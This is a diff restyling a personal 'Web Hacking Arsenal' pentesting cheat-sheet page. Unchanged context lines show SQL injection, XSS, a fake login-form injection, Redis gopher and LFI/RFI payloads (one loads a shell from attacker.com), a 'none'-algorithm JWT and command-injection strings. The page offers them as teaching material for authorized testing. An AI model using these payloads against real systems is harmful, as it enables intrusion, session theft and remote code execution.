@@ -3,96 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web Hacking Arsenal - Yamashita</title>
+    <title>Web Hacking Arsenal — Yamashita.Sec</title>
+    <meta name="description" content="Web application security testing field notes: OWASP Top 10, injection attacks, API security, and modern exploitation techniques.">
     <link rel="icon" type="image/x-icon" href="img/puffin_favicon.ico">
-    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --primary-red: #00ff9b;
-            --dark-bg: #0a0a0f;
-            --card-bg: #131318;
-            --text-primary: #ffffff;
-            --text-secondary: #a0a0b0;
-            --border-color: #1f1f2e;
-            --accent-gold: #00d4ff;
-        }
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=IBM+Plex+Sans:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="stylesheet" href="css/style.css">
+
+    <style>
+        /* ===== Page-scoped overrides — mapped onto the site's red-team palette ===== */
+        :root {
+            --primary-red: #ff2d4d;   /* crimson */
+            --dark-bg: #0d1013;
+            --card-bg: #12161b;
+            --text-primary: #eef1f4;
+            --text-secondary: #9aa4b2;
+            --border-color: #232a32;
+            --accent-gold: #ffb020;   /* amber */
+            --accent-cyan: #3ecfff;
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: var(--dark-bg);
-            color: var(--text-primary);
-            line-height: 1.6;
+            font-family: var(--font-body);
+            padding-top: 3px;
         }
 
-        .container {
+        .doc-container {
             max-width: 1400px;
             margin: 0 auto;
-            padding: 20px;
+            padding: 0 20px 20px;
         }
 
-        header {
-            background: linear-gradient(135deg, var(--dark-bg) 0%, #001a0a 100%);
-            border-bottom: 2px solid var(--primary-red);
-            padding: 30px 0;
-            margin-bottom: 30px;
+        .doc-hero {
+            padding: 150px 40px 50px;
+            text-align: center;
             position: relative;
         }
 
-        .header-content {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 0 20px;
-            flex-wrap: wrap;
-            gap: 20px;
+        .doc-hero .report-meta { margin-bottom: 26px; }
+
+        .doc-hero h1 {
+            font-family: var(--font-display);
+            font-size: clamp(2rem, 5vw, 3rem);
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 12px;
+            letter-spacing: 1px;
         }
 
-        .header-title {
-            text-align: left;
-            flex: 1;
+        .doc-hero .subtitle {
+            font-family: var(--font-mono);
+            color: var(--accent-cyan);
+            font-size: 1.05em;
+            margin-bottom: 22px;
         }
 
-        .back-link {
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-            padding: 12px 24px;
-            background: transparent;
-            color: var(--primary-red);
-            border: 2px solid var(--primary-red);
-            border-radius: 50px;
-            text-decoration: none;
-            font-weight: 600;
-            transition: all 0.3s ease;
-            font-family: 'Space Grotesk', sans-serif;
-        }
-
-        .back-link:hover {
-            background: var(--primary-red);
-            color: var(--dark-bg);
-            transform: translateX(-5px);
-        }
-
-        h1 {
-            font-size: 2.5em;
-            color: var(--primary-red);
-            margin-bottom: 10px;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-        }
-
-        .subtitle {
-            color: var(--accent-gold);
-            font-size: 1.1em;
-            font-style: italic;
+        .doc-hero .doc-desc {
+            color: var(--text-secondary);
+            max-width: 640px;
+            margin: 0 auto 30px;
         }
 
         .nav-tabs {
@@ -109,34 +81,30 @@
         .tab-btn {
             background: var(--dark-bg);
             color: var(--text-primary);
-            border: 2px solid var(--primary-red);
-            padding: 12px 24px;
+            border: 1px solid var(--border-color);
+            padding: 12px 22px;
             cursor: pointer;
-            border-radius: 5px;
-            font-size: 0.95em;
+            border-radius: 6px;
+            font-size: 0.9em;
+            font-family: var(--font-mono);
             transition: all 0.3s ease;
-            font-weight: 600;
+            font-weight: 500;
         }
 
         .tab-btn:hover {
-            background: var(--primary-red);
+            border-color: var(--primary-red);
             transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(196, 30, 58, 0.4);
+            box-shadow: 0 5px 15px rgba(255, 45, 77, 0.2);
         }
 
         .tab-btn.active {
             background: var(--primary-red);
-            color: white;
+            border-color: var(--primary-red);
+            color: #14060a;
         }
 
-        .section {
-            display: none;
-            animation: fadeIn 0.5s ease;
-        }
-
-        .section.active {
-            display: block;
-        }
+        .section { display: none; animation: fadeIn 0.5s ease; }
+        .section.active { display: block; }
 
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(20px); }
@@ -147,54 +115,56 @@
             background: var(--card-bg);
             border: 1px solid var(--border-color);
             border-left: 4px solid var(--primary-red);
-            border-radius: 8px;
-            padding: 25px;
+            border-radius: 10px;
+            padding: 30px;
             margin-bottom: 20px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+            box-shadow: var(--shadow-card);
             transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
 
         .card:hover {
-            transform: translateX(5px);
-            box-shadow: 0 6px 12px rgba(196, 30, 58, 0.2);
+            transform: translateX(4px);
+            box-shadow: 0 8px 20px rgba(255, 45, 77, 0.15);
         }
 
         h2 {
+            font-family: var(--font-display);
             color: var(--primary-red);
-            font-size: 1.8em;
-            margin-bottom: 15px;
-            border-bottom: 2px solid var(--primary-red);
-            padding-bottom: 10px;
+            font-size: 1.7em;
+            margin-bottom: 18px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 12px;
         }
 
         h3 {
-            color: var(--accent-gold);
-            font-size: 1.4em;
-            margin-top: 20px;
-            margin-bottom: 15px;
+            font-family: var(--font-display);
+            color: var(--accent-cyan);
+            font-size: 1.3em;
+            margin-top: 24px;
+            margin-bottom: 14px;
         }
 
         h4 {
             color: var(--text-primary);
-            font-size: 1.1em;
-            margin-top: 15px;
+            font-size: 1.05em;
+            margin-top: 16px;
             margin-bottom: 10px;
             font-weight: 600;
         }
 
         code {
             background: var(--dark-bg);
-            color: #00ff00;
+            color: var(--accent-cyan);
             padding: 2px 6px;
             border-radius: 3px;
-            font-family: 'Courier New', monospace;
+            font-family: var(--font-mono);
             font-size: 0.9em;
         }
 
         pre {
             background: var(--dark-bg);
             border: 1px solid var(--border-color);
-            border-radius: 5px;
+            border-radius: 6px;
             padding: 15px;
             overflow-x: auto;
             margin: 10px 0;
@@ -204,64 +174,42 @@
             background: none;
             padding: 0;
             display: block;
-            color: #00ff00;
+            color: var(--accent-cyan);
         }
 
         .command-box {
-            background: #000;
-            border: 2px solid var(--primary-red);
-            border-radius: 5px;
+            background: #08090b;
+            border: 1px solid var(--primary-red);
+            border-radius: 6px;
             padding: 15px;
             margin: 15px 0;
-            font-family: 'Courier New', monospace;
+            font-family: var(--font-mono);
+            font-size: 0.92em;
         }
 
-        .command-box .prompt {
-            color: var(--primary-red);
-            font-weight: bold;
-        }
-
-        .command-box .command {
-            color: #00ff00;
-        }
+        .command-box .prompt { color: var(--primary-red); font-weight: bold; }
+        .command-box .command { color: var(--accent-cyan); }
 
         .warning {
-            background: rgba(196, 30, 58, 0.1);
+            background: rgba(255, 45, 77, 0.08);
             border-left: 4px solid var(--primary-red);
             padding: 15px;
             margin: 15px 0;
-            border-radius: 5px;
+            border-radius: 6px;
         }
-
-        .warning::before {
-            content: "⚠ WARNING: ";
-            color: var(--primary-red);
-            font-weight: bold;
-        }
+        .warning::before { content: "⚠ WARNING: "; color: var(--primary-red); font-weight: bold; }
 
         .tip {
-            background: rgba(212, 175, 55, 0.1);
+            background: rgba(255, 176, 32, 0.08);
             border-left: 4px solid var(--accent-gold);
             padding: 15px;
             margin: 15px 0;
-            border-radius: 5px;
+            border-radius: 6px;
         }
+        .tip::before { content: "💡 TIP: "; color: var(--accent-gold); font-weight: bold; }
 
-        .tip::before {
-            content: "💡 TIP: ";
-            color: var(--accent-gold);
-            font-weight: bold;
-        }
-
-        ul, ol {
-            margin-left: 25px;
-            margin-bottom: 15px;
-        }
-
-        li {
-            margin-bottom: 8px;
-            color: var(--text-secondary);
-        }
+        ul, ol { margin-left: 25px; margin-bottom: 15px; }
+        li { margin-bottom: 8px; color: var(--text-secondary); }
 
         .grid {
             display: grid;
@@ -273,94 +221,37 @@
         .tool-card {
             background: var(--dark-bg);
             border: 1px solid var(--border-color);
-            border-radius: 5px;
+            border-radius: 6px;
             padding: 15px;
         }
+        .tool-card h4 { color: var(--primary-red); margin-top: 0; }
 
-        .tool-card h4 {
-            color: var(--primary-red);
-            margin-top: 0;
-        }
-
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin: 15px 0;
-            background: var(--dark-bg);
-        }
-
-        th {
-            background: var(--primary-red);
-            color: white;
-            padding: 12px;
-            text-align: left;
-            font-weight: 600;
-        }
-
-        td {
-            border: 1px solid var(--border-color);
-            padding: 10px;
-            color: var(--text-secondary);
-        }
-
-        tr:hover {
-            background: var(--card-bg);
-        }
+        table { width: 100%; border-collapse: collapse; margin: 15px 0; background: var(--dark-bg); }
+        th { background: var(--primary-red); color: #14060a; padding: 12px; text-align: left; font-weight: 600; font-family: var(--font-mono); font-size: 0.85em; }
+        td { border: 1px solid var(--border-color); padding: 10px; color: var(--text-secondary); }
+        tr:hover { background: var(--card-bg); }
 
         .search-box {
             width: 100%;
             padding: 15px;
             background: var(--card-bg);
-            border: 2px solid var(--primary-red);
-            border-radius: 5px;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
             color: var(--text-primary);
+            font-family: var(--font-body);
             font-size: 1em;
             margin-bottom: 20px;
+            transition: border-color 0.3s ease;
         }
-
         .search-box:focus {
             outline: none;
-            border-color: var(--accent-gold);
-            box-shadow: 0 0 10px rgba(212, 175, 55, 0.3);
-        }
-
-        footer {
-            text-align: center;
-            padding: 30px;
-            margin-top: 50px;
-            border-top: 2px solid var(--primary-red);
-            color: var(--text-secondary);
-        }
-
-        .back-to-top {
-            position: fixed;
-            bottom: 30px;
-            right: 30px;
-            background: var(--primary-red);
-            color: white;
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            opacity: 0;
-            transition: opacity 0.3s ease;
-            font-size: 1.5em;
-            box-shadow: 0 4px 10px rgba(196, 30, 58, 0.5);
-        }
-
-        .back-to-top.visible {
-            opacity: 1;
-        }
-
-        .back-to-top:hover {
-            background: var(--accent-gold);
+            border-color: var(--primary-red);
+            box-shadow: 0 0 0 3px rgba(255, 45, 77, 0.15);
         }
 
         @media (max-width: 768px) {
-            h1 { font-size: 2em; }
+            .doc-hero { padding: 120px 20px 40px; }
+            .doc-hero h1 { font-size: 1.8em; }
             .nav-tabs { flex-direction: column; }
             .tab-btn { width: 100%; }
             .grid { grid-template-columns: 1fr; }
@@ -368,19 +259,59 @@
     </style>
 </head>
 <body>
-    <header>
-        <div class="header-content">
-            <div class="header-title">
-                <h1>🗡️ Web Hacking Arsenal 🗡️</h1>
-                <p class="subtitle">"The blade that cuts through digital defenses"</p>
+    <canvas id="particles-canvas"></canvas>
+    <div class="cursor-dot" data-cursor-dot></div>
+    <div class="cursor-outline" data-cursor-outline></div>
+    <div class="tlp-strip" aria-hidden="true"></div>
+
+    <!-- Navigation -->
+    <nav class="navbar" id="navbar">
+        <div class="nav-container">
+            <a href="index.html#home" class="nav-logo">
+                <span class="logo-mark">Y</span>
+                <span class="logo-text">YAMASHITA<span class="logo-suffix">.SEC</span></span>
+            </a>
+            <div class="nav-menu" id="nav-menu">
+                <ul class="nav-list">
+                    <li class="nav-item"><a href="index.html#home" class="nav-link">Home</a></li>
+                    <li class="nav-item"><a href="index.html#about" class="nav-link">Profile</a></li>
+                    <li class="nav-item"><a href="/content/blogs.html" class="nav-link">Blogs</a></li>
+                    <li class="nav-item"><a href="index.html#skills" class="nav-link">Capabilities</a></li>
+                    <li class="nav-item"><a href="index.html#certifications" class="nav-link">Credentials</a></li>
+                    <li class="nav-item"><a href="network-map.html" class="nav-link">Path-Mapper</a></li>
+                    <li class="nav-item"><a href="index.html#projects" class="nav-link">Case Files</a></li>
+                    <li class="nav-item"><a href="Notes.html" class="nav-link active">Notes</a></li>
+                    <li class="nav-item"><a href="index.html#contact" class="nav-link">Contact</a></li>
+                </ul>
+                <div class="nav-badge">TLP:AMBER</div>
             </div>
-            <a href="index.html" class="back-link">
-                <span>← Back to Portfolio</span>
+            <div class="nav-toggle" id="nav-toggle"><span></span><span></span><span></span></div>
+        </div>
+    </nav>
+
+    <!-- Hero -->
+    <section class="hero doc-hero">
+        <div class="hero-background"><div class="hero-grid"></div></div>
+        <div class="hero-content">
+            <div class="report-meta" data-aos="fade-down">
+                <span class="report-meta-item"><i class="fas fa-globe"></i> FIELD MANUAL</span>
+                <span class="report-meta-divider">//</span>
+                <span class="report-meta-item">REF: YM-NOTES-WEB</span>
+            </div>
+            <h1>Web Hacking Arsenal</h1>
+            <p class="subtitle">The blade that cuts through digital defenses</p>
+            <p class="doc-desc">
+                Reconnaissance, injection, authentication abuse, SSRF, deserialization, and API testing —
+                a working methodology built from real engagements.
+            </p>
+            <a href="Notes.html" class="btn btn-secondary">
+                <i class="fas fa-arrow-left"></i>
+                <span>Back to Notes</span>
             </a>
         </div>
-    </header>
+    </section>
 
-    <div class="container">
+    <div class="doc-container">
         <input type="text" class="search-box" id="searchBox" placeholder="🔍 Search the arsenal... (e.g., 'SQL injection', 'XSS', 'tools')">
 
         <div class="nav-tabs">
@@ -401,8 +332,8 @@
         <!-- RECONNAISSANCE SECTION -->
         <div id="recon" class="section active">
             <div class="card">
-                <h2>🔭 Reconnaissance & Enumeration</h2>
-                
+                <h2>Reconnaissance & Enumeration</h2>
+
                 <h3>Subdomain Enumeration</h3>
                 <div class="command-box">
                     <span class="prompt">$</span> <span class="command">subfinder -d target.com -o subdomains.txt</span><br>
@@ -461,8 +392,8 @@ site:target.com intitle:"index of" "parent directory"</code></pre>
         <!-- SQL INJECTION SECTION -->
         <div id="sqli" class="section">
             <div class="card">
-                <h2>💉 SQL Injection</h2>
-                
+                <h2>SQL Injection</h2>
+
                 <h3>Detection Payloads</h3>
                 <pre><code>' OR '1'='1
 ' OR '1'='1' --
@@ -544,7 +475,7 @@ EXEC xp_cmdshell 'whoami'
 EXEC sp_configure 'show advanced options', 1</code></pre>
 
                 <div class="warning">
-                    Always test in authorized environments only. SQL injection can cause data loss and system damage. SKARR AKAO BOTSA!!! MY CHOMMIE.
+                    Always test in authorized environments only. SQL injection can cause data loss and system damage.
                 </div>
             </div>
         </div>
@@ -552,8 +483,8 @@ EXEC sp_configure 'show advanced options', 1</code></pre>
         <!-- XSS SECTION -->
         <div id="xss" class="section">
             <div class="card">
-                <h2>🔥 Cross-Site Scripting (XSS)</h2>
-                
+                <h2>Cross-Site Scripting (XSS)</h2>
+
                 <h3>Basic XSS Payloads</h3>
                 <pre><code>&lt;script&gt;alert('XSS')&lt;/script&gt;
 &lt;script&gt;alert(document.cookie)&lt;/script&gt;
@@ -605,26 +536,10 @@ document.body.innerHTML = '&lt;h1&gt;Session Expired&lt;/h1&gt;&lt;form action="
 
                 <h3>Stored vs Reflected XSS</h3>
                 <table>
-                    <tr>
-                        <th>Type</th>
-                        <th>Description</th>
-                        <th>Testing Approach</th>
-                    </tr>
-                    <tr>
-                        <td><strong>Reflected</strong></td>
-                        <td>Payload in URL/request, reflected in response</td>
-                        <td>Test all input fields, URL parameters, headers</td>
-                    </tr>
-                    <tr>
-                        <td><strong>Stored</strong></td>
-                        <td>Payload saved in database, executed when viewed</td>
-                        <td>Test comments, profiles, posts, messages</td>
-                    </tr>
-                    <tr>
-                        <td><strong>DOM-Based</strong></td>
-                        <td>Executed client-side via DOM manipulation</td>
-                        <td>Analyze JavaScript, test URL fragments (#)</td>
-                    </tr>
+                    <tr><th>Type</th><th>Description</th><th>Testing Approach</th></tr>
+                    <tr><td><strong>Reflected</strong></td><td>Payload in URL/request, reflected in response</td><td>Test all input fields, URL parameters, headers</td></tr>
+                    <tr><td><strong>Stored</strong></td><td>Payload saved in database, executed when viewed</td><td>Test comments, profiles, posts, messages</td></tr>
+                    <tr><td><strong>DOM-Based</strong></td><td>Executed client-side via DOM manipulation</td><td>Analyze JavaScript, test URL fragments (#)</td></tr>
                 </table>
 
                 <h3>CSP Bypass</h3>
@@ -657,8 +572,8 @@ document.body.innerHTML = '&lt;h1&gt;Session Expired&lt;/h1&gt;&lt;form action="
         <!-- AUTHENTICATION SECTION -->
         <div id="auth" class="section">
             <div class="card">
-                <h2>🔐 Authentication & Session Management</h2>
-                
+                <h2>Authentication & Session Management</h2>
+
                 <h3>Common Authentication Flaws</h3>
                 <ul>
                     <li>Weak password policy</li>
@@ -775,8 +690,8 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.</code></pre>
         <!-- IDOR & ACCESS CONTROL SECTION -->
         <div id="idor" class="section">
             <div class="card">
-                <h2>🚪 IDOR & Broken Access Control</h2>
-                
+                <h2>IDOR & Broken Access Control</h2>
+
                 <h3>What is IDOR?</h3>
                 <p>Insecure Direct Object Reference - accessing resources by modifying parameter values without proper authorization checks.</p>
 
@@ -828,21 +743,9 @@ GET /api/user/%2e%2e%2fadmin/123</code></pre>
 
                 <h3>Horizontal vs Vertical Privilege Escalation</h3>
                 <table>
-                    <tr>
-                        <th>Type</th>
-                        <th>Description</th>
-                        <th>Example</th>
-                    </tr>
-                    <tr>
-                        <td><strong>Horizontal</strong></td>
-                        <td>Access resources of same privilege level</td>
-                        <td>User A accesses User B's profile</td>
-                    </tr>
-                    <tr>
-                        <td><strong>Vertical</strong></td>
-                        <td>Access resources of higher privilege</td>
-                        <td>Regular user accesses admin panel</td>
-                    </tr>
+                    <tr><th>Type</th><th>Description</th><th>Example</th></tr>
+                    <tr><td><strong>Horizontal</strong></td><td>Access resources of same privilege level</td><td>User A accesses User B's profile</td></tr>
+                    <tr><td><strong>Vertical</strong></td><td>Access resources of higher privilege</td><td>Regular user accesses admin panel</td></tr>
                 </table>
 
                 <h3>Common Vulnerable Endpoints</h3>
@@ -898,8 +801,8 @@ https://target.com/staff</code></pre>
         <!-- SSRF SECTION -->
         <div id="ssrf" class="section">
             <div class="card">
-                <h2>🌐 Server-Side Request Forgery (SSRF)</h2>
-                
+                <h2>Server-Side Request Forgery (SSRF)</h2>
+
                 <h3>What is SSRF?</h3>
                 <p>SSRF allows an attacker to make the server send requests to internal or external systems, potentially accessing internal resources or services.</p>
 
@@ -1021,8 +924,8 @@ gopher://127.0.0.1:6379/_CONFIG%20SET%20dbfilename%20shell.php</code></pre>
         <!-- LFI/RFI SECTION -->
         <div id="lfi" class="section">
             <div class="card">
-                <h2>📁 Local/Remote File Inclusion (LFI/RFI)</h2>
-                
+                <h2>Local/Remote File Inclusion (LFI/RFI)</h2>
+
                 <h3>Basic LFI Payloads</h3>
                 <pre><code>../../../etc/passwd
 ..%2F..%2F..%2Fetc%2Fpasswd
@@ -1149,8 +1052,8 @@ page.php?file=ftp://attacker.com/shell.txt</code></pre>
         <!-- XXE SECTION -->
         <div id="xxe" class="section">
             <div class="card">
-                <h2>📄 XML External Entity (XXE)</h2>
-                
+                <h2>XML External Entity (XXE)</h2>
+
                 <h3>What is XXE?</h3>
                 <p>XXE exploits XML parsers that process external entity references, allowing file disclosure, SSRF, or RCE.</p>
 
@@ -1255,8 +1158,8 @@ page.php?file=ftp://attacker.com/shell.txt</code></pre>
         <!-- DESERIALIZATION SECTION -->
         <div id="deserial" class="section">
             <div class="card">
-                <h2>🔓 Insecure Deserialization</h2>
-                
+                <h2>Insecure Deserialization</h2>
+
                 <h3>What is Deserialization?</h3>
                 <p>Converting serialized data back to objects. Insecure deserialization allows attackers to manipulate serialized objects to execute arbitrary code, escalate privileges, or bypass authentication.</p>
 
@@ -1383,36 +1286,12 @@ payload = Marshal.dump(eval(eval_code))</code></pre>
 
                 <h3>Common Vulnerable Components</h3>
                 <table>
-                    <tr>
-                        <th>Language</th>
-                        <th>Library</th>
-                        <th>Tool</th>
-                    </tr>
-                    <tr>
-                        <td>Java</td>
-                        <td>Commons Collections</td>
-                        <td>ysoserial</td>
-                    </tr>
-                    <tr>
-                        <td>PHP</td>
-                        <td>unserialize()</td>
-                        <td>PHPGGC</td>
-                    </tr>
-                    <tr>
-                        <td>.NET</td>
-                        <td>BinaryFormatter</td>
-                        <td>ysoserial.net</td>
-                    </tr>
-                    <tr>
-                        <td>Python</td>
-                        <td>pickle</td>
-                        <td>Manual crafting</td>
-                    </tr>
-                    <tr>
-                        <td>Ruby</td>
-                        <td>Marshal</td>
-                        <td>Manual crafting</td>
-                    </tr>
+                    <tr><th>Language</th><th>Library</th><th>Tool</th></tr>
+                    <tr><td>Java</td><td>Commons Collections</td><td>ysoserial</td></tr>
+                    <tr><td>PHP</td><td>unserialize()</td><td>PHPGGC</td></tr>
+                    <tr><td>.NET</td><td>BinaryFormatter</td><td>ysoserial.net</td></tr>
+                    <tr><td>Python</td><td>pickle</td><td>Manual crafting</td></tr>
+                    <tr><td>Ruby</td><td>Marshal</td><td>Manual crafting</td></tr>
                 </table>
 
                 <div class="warning">
@@ -1424,8 +1303,8 @@ payload = Marshal.dump(eval(eval_code))</code></pre>
         <!-- API TESTING SECTION -->
         <div id="api" class="section">
             <div class="card">
-                <h2>⚡ API Security Testing</h2>
-                
+                <h2>API Security Testing</h2>
+
                 <h3>API Reconnaissance</h3>
                 <h4>Finding APIs</h4>
                 <ul>
@@ -1565,30 +1444,12 @@ Content-Type: text/plain
 
                 <h3>API Testing Tools</h3>
                 <div class="grid">
-                    <div class="tool-card">
-                        <h4>Postman</h4>
-                        <p>API development & testing platform</p>
-                    </div>
-                    <div class="tool-card">
-                        <h4>Burp Suite</h4>
-                        <p>Intercept and modify API requests</p>
-                    </div>
-                    <div class="tool-card">
-                        <h4>OWASP ZAP</h4>
-                        <p>Automated API scanning</p>
-                    </div>
-                    <div class="tool-card">
-                        <h4>Arjun</h4>
-                        <p>Hidden parameter discovery</p>
-                    </div>
-                    <div class="tool-card">
-                        <h4>GraphQL Voyager</h4>
-                        <p>Visualize GraphQL schemas</p>
-                    </div>
-                    <div class="tool-card">
-                        <h4>Kiterunner</h4>
-                        <p>API endpoint & content discovery</p>
-                    </div>
+                    <div class="tool-card"><h4>Postman</h4><p>API development & testing platform</p></div>
+                    <div class="tool-card"><h4>Burp Suite</h4><p>Intercept and modify API requests</p></div>
+                    <div class="tool-card"><h4>OWASP ZAP</h4><p>Automated API scanning</p></div>
+                    <div class="tool-card"><h4>Arjun</h4><p>Hidden parameter discovery</p></div>
+                    <div class="tool-card"><h4>GraphQL Voyager</h4><p>Visualize GraphQL schemas</p></div>
+                    <div class="tool-card"><h4>Kiterunner</h4><p>API endpoint & content discovery</p></div>
                 </div>
 
                 <div class="tip">
@@ -1600,8 +1461,8 @@ Content-Type: text/plain
         <!-- TOOLS SECTION -->
         <div id="tools" class="section">
             <div class="card">
-                <h2>🛠️ Essential Tools & Commands</h2>
-                
+                <h2>Essential Tools & Commands</h2>
+
                 <h3>Reconnaissance Tools</h3>
                 <div class="grid">
                     <div class="tool-card">
@@ -1739,8 +1600,8 @@ reset</code></pre>
         <!-- PAYLOADS SECTION -->
         <div id="payloads" class="section">
             <div class="card">
-                <h2>💣 Payload Library</h2>
-                
+                <h2>Payload Library</h2>
+
                 <h3>Command Injection Payloads</h3>
                 <pre><code># Basic
 ; whoami
@@ -1891,46 +1752,51 @@ def handleResponse(req, interesting):
     table.add(req)</code></pre>
 
                 <div class="warning">
-                    These payloads are for authorized testing only. Unauthorized testing is illegal. WANG TSWARA!!
+                    These payloads are for authorized testing only. Unauthorized testing is illegal.
                 </div>
             </div>
         </div>
     </div>
 
-    <div class="back-to-top" id="backToTop" onclick="scrollToTop()">↑</div>
-
-    <footer>
-        <p>© 2025 Yamashita - Cyber Samurai | Web Hacking Arsenal</p>
-        <p><em>"In pentesting, as in battle, preparation and knowledge are the keys to victory."</em></p>
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-brand">
+                    <h3>YAMASHITA<span class="logo-suffix">.SEC</span></h3>
+                    <p>Red Team Operator • Digital Guardian</p>
+                </div>
+                <div class="footer-links">
+                    <a href="index.html#home">Home</a>
+                    <a href="index.html#about">Profile</a>
+                    <a href="Notes.html">Notes</a>
+                    <a href="index.html#contact">Contact</a>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2026 Yamashita Moleya. All rights reserved. | Web Hacking Arsenal</p>
+                <p class="footer-tagline">"In pentesting, as in battle, preparation and knowledge are the keys to victory."</p>
+            </div>
+        </div>
     </footer>
 
+    <button class="scroll-top" id="scroll-top"><i class="fas fa-chevron-up"></i></button>
+
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+    <script src="js/script.js"></script>
+
     <script>
-        // Tab switching
         function showSection(sectionId) {
-            // Hide all sections
-            document.querySelectorAll('.section').forEach(section => {
-                section.classList.remove('active');
-            });
-            
-            // Remove active class from all buttons
-            document.querySelectorAll('.tab-btn').forEach(btn => {
-                btn.classList.remove('active');
-            });
-            
-            // Show selected section
+            document.querySelectorAll('.section').forEach(section => section.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
             document.getElementById(sectionId).classList.add('active');
-            
-            // Add active class to clicked button
             event.target.classList.add('active');
-            
-            // Scroll to top
-            window.scrollTo(0, 0);
+            window.scrollTo({ top: document.querySelector('.doc-container').offsetTop - 100, behavior: 'smooth' });
         }
 
-        // Search functionality
-        document.getElementById('searchBox').addEventListener('input', function(e) {
+        document.getElementById('searchBox').addEventListener('input', function (e) {
             const searchTerm = e.target.value.toLowerCase();
-            
             document.querySelectorAll('.section').forEach(section => {
                 const content = section.textContent.toLowerCase();
                 if (content.includes(searchTerm)) {
@@ -1939,62 +1805,30 @@ def handleResponse(req, interesting):
                     section.style.display = 'none';
                 }
             });
-
-            // If search is empty, show only active section
             if (searchTerm === '') {
                 document.querySelectorAll('.section').forEach(section => {
-                    if (section.classList.contains('active')) {
-                        section.style.display = 'block';
-                    } else {
-                        section.style.display = 'none';
-                    }
+                    section.style.display = section.classList.contains('active') ? 'block' : 'none';
                 });
             }
         });
 
-        // Back to top button
-        window.addEventListener('scroll', function() {
-            const backToTop = document.getElementById('backToTop');
-            if (window.pageYOffset > 300) {
-                backToTop.classList.add('visible');
-            } else {
-                backToTop.classList.remove('visible');
-            }
-        });
-
-        function scrollToTop() {
-            window.scrollTo({
-                top: 0,
-                behavior: 'smooth'
-            });
-        }
-
-        // Copy code on click
         document.querySelectorAll('pre code').forEach(block => {
-            block.addEventListener('click', function() {
-                const text = this.textContent;
-                navigator.clipboard.writeText(text).then(() => {
-                    // Visual feedback
+            block.addEventListener('click', function () {
+                navigator.clipboard.writeText(this.textContent).then(() => {
                     const original = this.style.background;
-                    this.style.background = 'rgba(212, 175, 55, 0.2)';
-                    setTimeout(() => {
-                        this.style.background = original;
-                    }, 200);
+                    this.style.background = 'rgba(255, 176, 32, 0.2)';
+                    setTimeout(() => { this.style.background = original; }, 200);
                 });
             });
         });
 
-        // Keyboard shortcuts
-        document.addEventListener('keydown', function(e) {
-            // Press 's' to focus search
+        document.addEventListener('keydown', function (e) {
             if (e.key === 's' && !e.ctrlKey && !e.metaKey) {
                 if (document.activeElement !== document.getElementById('searchBox')) {
                     e.preventDefault();
                     document.getElementById('searchBox').focus();
                 }
             }
-            
-            // Press 'Esc' to clear search
             if (e.key === 'Escape') {
                 document.getElementById('searchBox').value = '';
                 document.getElementById('searchBox').dispatchEvent(new Event('input'));
